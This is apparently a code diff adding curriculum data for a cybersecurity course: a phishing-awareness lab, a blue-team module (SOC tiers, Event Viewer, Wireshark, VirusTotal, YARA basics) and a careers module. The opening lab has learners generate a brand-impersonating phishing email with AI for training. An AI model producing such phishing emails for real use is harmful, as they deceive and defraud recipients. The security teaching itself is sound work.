+          "Compare the AI-assisted version's speed/accuracy against the original manual version",
+        ],
+      },
+      {
+        id: "m13-10",
+        moduleId: "m13",
+        number: 161,
+        title: "Lab: Writing phishing email templates with AI (awareness exercise)",
+        type: "lab",
+        week: 11,
+        description:
+          "Generate a sample phishing email with AI purely as a security-awareness exercise, then annotate exactly which elements make it convincing.",
+        keyPoints: [
+          "Generate an email impersonating a known brand with an urgency-driven call to action",
+          "Annotate the manipulation techniques used: urgency, authority, fear, fake branding",
+          "This exercise is for awareness/training content only — never send generated phishing content to real people outside an authorised, scoped engagement",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M14: Blue Team / Defensive Security Intro
+  // ============================================================
+  {
+    id: "m14",
+    name: "M14: Blue Team / Defensive Security Intro",
+    shortName: "Blue Team Intro",
+    month: 3,
+    weeks: [12],
+    description:
+      "Every good offensive tester understands the defender's side too — this module covers SOC structure, the core blue-team disciplines, and three hands-on investigation labs (Event Viewer, Wireshark, VirusTotal) that mirror what a Tier 1/2 SOC analyst does daily.",
+    estimatedHours: 8,
+    outcomes: [
+      "Explain the SOC tier structure and each tier's responsibilities",
+      "Name the key blue-team disciplines (SIEM, threat intel, IR, DFIR, IAM)",
+      "Investigate a Windows Event Log for indicators of compromise",
+      "Analyse a PCAP file in Wireshark to identify suspicious traffic",
+      "Use VirusTotal to triage a suspicious file by hash",
+    ],
+    resources: [
+      { title: "TryHackMe SOC Level 1", url: "https://tryhackme.com", type: "platform" },
+      { title: "VirusTotal", url: "https://www.virustotal.com", type: "tool" },
+    ],
+    topics: [
+      {
+        id: "m14-1",
+        moduleId: "m14",
+        number: 162,
+        title: "Defensive Security Overview & Why Pentesters Should Understand It",
+        type: "theory",
+        week: 12,
+        description:
+          "Defensive security protects assets by preventing, detecting, and responding to threats — a 'castle' to offensive security's siege, and understanding it makes you a sharper, more realistic attacker.",
+        keyPoints: [
+          "Core areas: Network Security, Endpoint Security (EDR), Application Security, IAM, Threat Intelligence, Incident Response, Security Awareness Training",
+          "Importance: prevents breaches, ensures regulatory compliance (GDPR, ISO 27001), protects reputation and reduces financial loss",
+        ],
+      },
+      {
+        id: "m14-2",
+        moduleId: "m14",
+        number: 163,
+        title: "SOC Structure (Tier 1/2/3 analyst, incident lifecycle)",
+        type: "theory",
+        week: 12,
+        description:
+          "A Security Operations Center monitors, detects, and responds to threats 24/7 — the organisation's first line of defence, staffed across escalating tiers of expertise.",
+        keyPoints: [
+          "Tier 1 (Junior Analyst): first responder, monitors SIEM alerts, triages and escalates serious threats",
+          "Tier 2 (Incident Responder): investigates threats in depth, analyses malware/suspicious activity, contains incidents",
+          "Tier 3 (Threat Hunter/Advanced Analyst): proactively hunts hidden threats, deep forensic investigation, builds detection rules",
+        ],
+      },
+      {
+        id: "m14-3",
+        moduleId: "m14",
+        number: 164,
+        title: "Key Blue Team Areas (SIEM, Threat Intel, IR, DFIR, IAM)",
+        type: "theory",
+        week: 12,
+        description:
+          "The disciplines that make up a mature defensive security programme, each staffed by different specialist roles.",
+        keyPoints: [
+          "SIEM: aggregates and correlates logs across the organisation to detect suspicious patterns",
+          "Threat Intelligence: tracks known threat actors, IOCs, and TTPs relevant to the organisation",
+          "Incident Response (IR): the structured process for handling an active security incident",
+          "DFIR (Digital Forensics & Incident Response): deep technical investigation after an incident, often for legal/evidentiary purposes",
+          "IAM (Identity and Access Management): governs who can access what, and enforces least privilege",
+        ],
+      },
+      {
+        id: "m14-4",
+        moduleId: "m14",
+        number: 165,
+        title: "Lab: Log Analysis with Windows Event Viewer",
+        type: "lab",
+        week: 12,
+        description:
+          "Investigate a provided Windows Event Log (.evtx) to reconstruct a malware-infection timeline and find 3 flag fragments hidden across different Event IDs.",
+        keyPoints: [
+          "Load the .evtx file into Event Viewer's Saved Logs pane rather than reading live logs",
+          "Filter by Event ID rather than scrolling — 11707/1033 (installation events), 4657 (registry key change), 1074 (shutdown event)",
+          "Reconstruct the timeline: suspicious software installed → it modified a Run registry key → every login now triggers a shutdown",
+        ],
+      },
+      {
+        id: "m14-5",
+        moduleId: "m14",
+        number: 166,
+        title: "Lab: Network Traffic Analysis with Wireshark (PCAP file)",
+        type: "lab",
+        week: 12,
+        description:
+          "Analyse a provided PCAP capture between two hosts, follow the TCP stream, and decode a hidden flag from the traffic content.",
+        keyPoints: [
+          "Statistics view first — check source/destination IPs and protocol breakdown for anything unusual",
+          "Identify the 3-way TCP handshake followed by an HTTP GET request",
+          "Right-click → Follow → TCP Stream to view the full request/response conversation",
+          "Recognise ROT13-style obfuscation in the stream content and decode it to recover the flag",
+        ],
+      },
+      {
+        id: "m14-6",
+        moduleId: "m14",
+        number: 167,
+        title: "Lab: Malware Detection with VirusTotal",
+        type: "lab",
+        week: 12,
+        description:
+          "Analyse a suspicious binary by computing its hash and submitting it to VirusTotal for multi-engine detection.",
+        keyPoints: [
+          "file identifies the binary type; sha256sum computes the hash to submit",
+          "VirusTotal aggregates verdicts from dozens of AV engines — look at both the detection count and named malware family",
+          "VirusTotal is excellent for triage but can miss brand-new malware strains — treat a clean result as inconclusive, not proof-of-safety",
+        ],
+        terminalCommands: ["file suspicious.elf", "sha256sum suspicious.elf"],
+      },
+      {
+        id: "m14-7",
+        moduleId: "m14",
+        number: 168,
+        title: "Incident Response Lifecycle (Prepare, Detect, Contain, Eradicate, Recover)",
+        type: "theory",
+        week: 12,
+        description:
+          "The standard structured framework for handling a security incident from readiness through to lessons learned.",
+        keyPoints: [
+          "Prepare: policies, tooling, and training in place before an incident occurs",
+          "Detect & Analyse: identify that an incident is happening and understand its scope",
+          "Contain, Eradicate, Recover: stop the spread, remove the threat, restore normal operations",
+          "Post-Incident (Lessons Learned): document what happened and improve defences/playbooks",
+        ],
+      },
+      {
+        id: "m14-8",
+        moduleId: "m14",
+        number: 169,
+        title: "YARA Rules Introduction",
+        type: "theory",
+        week: 12,
+        description:
+          "YARA is a pattern-matching tool for identifying and classifying malware samples based on strings and code patterns — 'grep for malware researchers.'",
+        keyPoints: [
+          "A YARA rule defines strings/patterns plus a boolean condition for when a file matches",
+          "Used heavily in threat intelligence and malware research to tag families of related samples",
+          "IOC types a rule can encode: Atomic (a hash/IP), Computed (a fuzzy hash), Behavioural (a code pattern)",
+        ],
+        terminalCommands: [
+          "rule ExampleRule {\n  strings:\n    $a = \"malicious_string\"\n  condition:\n    $a\n}",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M15: Careers & Certifications
+  // ============================================================
+  {
+    id: "m15",
+    name: "M15: Careers & Certifications",
+    shortName: "Careers & Certs",
+    month: 3,
+    weeks: [12],
+    description:
+      "The programme's closing module — mapping what you've learned onto real career paths, certification roadmaps, and the communities (CTFs, bug bounty) where you'll keep growing after week 12.",
+    estimatedHours: 4,
+    outcomes: [
+      "Identify cybersecurity career roles that match your interests",
+      "Plan a certification roadmap from entry-level to advanced",
+      "Understand how to start building a public portfolio",
+      "Know where to find bug bounty programmes and CTF competitions",
+    ],
+    resources: [
+      { title: "roadmap.sh/cyber-security", url: "https://roadmap.sh/cyber-security", type: "link" },
+      { title: "TryHackMe", url: "https://tryhackme.com", type: "platform" },
+      { title: "Hack The Box", url: "https://www.hackthebox.com", type: "platform" },
+    ],
+    topics: [
+      {
+        id: "m15-1",
+        moduleId: "m15",
+        number: 170,
+        title: "Cybersecurity Career Roles (Pen Tester, SOC Analyst, Red Teamer, Bug Bounty Hunter)",
+        type: "theory",
+        week: 12,
+        description:
+          "A field with far more specialisations than 'hacker vs defender' — this survey maps the roles this programme has touched on to real job titles.",
+        keyPoints: [
+          "Security Analyst, Penetration Tester, SOC Analyst, Incident Responder, Malware Analyst, Threat Hunter",
+          "Security Engineer, GRC Analyst, Cloud Security Engineer, Red Teamer, Blue Teamer",
+          "Why cybersecurity: high demand, strong entry-level salaries, job security, wide variety of specialisations",
+        ],
+      },
+      {
+        id: "m15-2",
+        moduleId: "m15",
+        number: 171,
+        title: "Certifications Roadmap (eJPT > CEH/PNPT > OSCP > OSEP)",
+        type: "theory",
+        week: 12,
+        description:
+          "A 3-phase path from foundational knowledge to advanced, hands-on-exam certifications — matched to what this course has already covered.",
+        keyPoints: [
+          "Phase 1 (Foundation): networking basics, OS fundamentals (Windows/Linux), CIA triad and threats, CTF practice on TryHackMe/HackTheBox",
+          "Phase 2 (Core Skills): scripting (Python/Bash), OWASP Top 10 web app security, recon/vulnerability assessment, personal lab projects",
+          "Phase 3 (Specialisation): choose a path (red team/blue team/malware analysis) and pursue certifications — eJPT, CEH, OSCP, CompTIA Security+",
+          "eJPT is the natural first certification target immediately after completing this programme",
+        ],
+      },
+      {
+        id: "m15-3",
+        moduleId: "m15",
+        number: 172,
+        title: "CompTIA Security+ Overview & Relevance",
+        type: "theory",
+        week: 12,
+        description:
+          "A vendor-neutral, foundational certification widely required as a baseline for entry-level security roles, especially in government/regulated sectors.",
+        keyPoints: [
+          "Covers general security concepts, risk management, and basic cryptography/network security",
+          "Often listed as a minimum requirement in job postings even for roles that later require deeper offensive skills",
+        ],
+      },
+      {
+        id: "m15-4",
+        moduleId: "m15",
+        number: 173,
+        title: "Building a Home Lab & Public Portfolio (GitHub, writeups)",
+        type: "theory",
+        week: 12,
+        description:
+          "A visible portfolio of real practice is often what actually gets an entry-level candidate hired — certifications prove knowledge, a portfolio proves you can apply it.",
+        keyPoints: [
+          "Build a portfolio: publish CTF/lab writeups, contribute to open-source security tools, write technical blog posts",
+          "A home lab (VMs for Kali + vulnerable targets) lets you practice everything in this course safely and repeatably",
+          "Document your VulnMachines/HackTheBox writeups from M11 as the first entries in your portfolio",
+        ],
+      },
+      {
+        id: "m15-5",
+        moduleId: "m15",
+        number: 174,
+        title: "Bug Bounty Basics (HackerOne, Bugcrowd, VDP programmes)",
+        type: "theory",
+        week: 12,
+        description:
+          "Bug bounty programmes pay independent researchers to find and responsibly report vulnerabilities in production systems — a natural next step once the fundamentals in this course are solid.",
+        keyPoints: [
+          "Platforms: HackerOne and Bugcrowd host the majority of public bug bounty programmes",
+          "VDP (Vulnerability Disclosure Programme): accepts reports but doesn't necessarily pay a bounty — still valuable for building a reputation",
+          "Always read and stay strictly within a programme's published scope and safe-harbor terms before testing",
+        ],
+      },
+      {
+        id: "m15-6",
+        moduleId: "m15",
+        number: 175,
+        title: "CTF Competitions & How to Get Started (TryHackMe, HackTheBox, PicoCTF)",
+        type: "theory",
+        week: 12,
+        description:
+          "Capture The Flag competitions are gamified, legal practice environments — the single best way to keep skills sharp after this programme ends.",
+        keyPoints: [
+          "TryHackMe: guided, beginner-friendly rooms with structure and hints",
+          "Hack The Box: less guided, more realistic machines for intermediate/advanced practice",
+          "PicoCTF: education-focused, beginner-friendly jeopardy-style CTF, great for first-timers",
+        ],
+      },
+    ],
+  },
+]
+
